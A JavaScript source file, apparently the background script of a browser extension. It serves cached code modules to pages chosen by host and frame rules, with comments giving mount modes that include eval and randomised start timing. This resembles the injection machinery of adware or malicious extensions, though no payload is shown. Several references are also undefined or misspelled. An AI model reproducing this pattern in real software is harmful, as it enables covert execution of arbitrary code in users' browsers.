'use strict';

import { iframeResolver, hostResolver } from './resolvers';

class BetDealer {
  constructor (bg) {
    this.bg = bg;
    this.listeners = 0;
  }

  send (msg, cb) {
    this.runtime.sendMessage(null, msg, null, cb);
  }

  addListener () {
    this.listeners += 1;
    this.runtime.onMessage.addListener((message, sender, sendResponse) => {
      console.log('message', message);
      this.processMessage(message, this.appId, sendResponse);
      return true;
    });
  }

  processMessage (message, id, sendResponse) {
    if ('object' !== typeof message) {
      return this.sendError(sendResponse);
    }

    switch (message.type) {
      case 'PING':
        return this.sendPong(sendResponse);
      case 'GET_MODULES':
        return this.sendModules(sendResponse, message.payload);
      default:
        return this.sendError(sendResponse);
    }
  }

  sendPong (sendResponse) {
    this.sendResponse(sendResponse, 'pong');
  }

  sendModules (sendResponse, payload) {
    this.sendResponse(
      sendResponse,
      {
        payload: this.getModulses(payload),
      },
    );
  }

  sendError (sendResponse, errMessage = 'Error') {
    this.sendResponse(sendResponse, errMessage, true);
  }

  sendResponse (sendResponse, value, err = false) {
    sendResponse({ err, value });
  }

  getModulses (payload) {
    const modules = [];
    const config = this.getConfig();

    config.forEach((part) => {
      if (
        iframeResolver(part.f, payload.isFrame)
        &&
        hostResolver(part.h, payload.host)
        &&
        Array.isArray(part.l)
      ) {
        part.l.forEach((l) => {
          if (this.bg.cache.modules.has(l)) {
            modules.push({
              i: ('number' === typeof part.i) ? part.i : 0, // mount as (txt-0|eval-1|api-2|link-3)
              r: ('number' === typeof part.r) ? part.r : 0, // start at (dom-0|now-1|rnd-2|delay-xx)
              c: this.bg.cache.modules.get(l), // code txt
            });
          }
        });
      }
    });

    return modules;
  }

  getConfig () {
    return this.bg.cache.config.get('config') || [];
  }
}

export default BetDealer;
